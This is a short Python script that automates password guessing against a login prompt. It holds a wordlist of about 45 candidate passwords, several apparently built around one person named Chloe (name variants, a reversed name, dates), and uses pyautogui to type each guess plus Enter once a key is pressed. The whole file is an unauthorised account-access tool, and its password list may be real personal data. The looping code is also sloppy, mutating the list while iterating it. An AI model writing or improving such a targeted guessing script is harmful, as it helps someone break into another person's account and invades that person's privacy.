passes = """
password

asdfer

password

gothgurl
password

abc123

password

chloe2002

password

geddes

password

chloecafeisthebest

password

justsell1

password

catwoman

password

9ioyV8vG

password

chelsea3

password

10111997

password

cr301997

password

tashalove1

password

jasmine1995

password

Bacon5

password

pixy11

password

Butterfly199

password

ouders

password

23avezel

password

kousked71150

password

Folorunsho

password

4623m

password

emokidd

password

chloe256

password

dancing
password

0105eolhC

password

wagamamas

password

rudyzarfas1

password

chloe27

password

cocofrancis!

password

chloefrancis
password

cicerond

password

waterboy22

password

poo1212

password

091905
password

kiwiss

password

Alex21091

password

chloerocks

password

fiona102

password

zadiebug07
"""

passes = passes.replace("password", ""); passes = passes.replace(" ", ""); passes = passes.split()
import pyautogui; import keyboard; break_ = True
def ses():
    while True:
        if keyboard.is_pressed("q"):
            break_ = False
            for i in passes:
                a = i
                if break_ != True: pyautogui.typewrite(a+"\n"); break_ = True; passes.remove(i)

ses()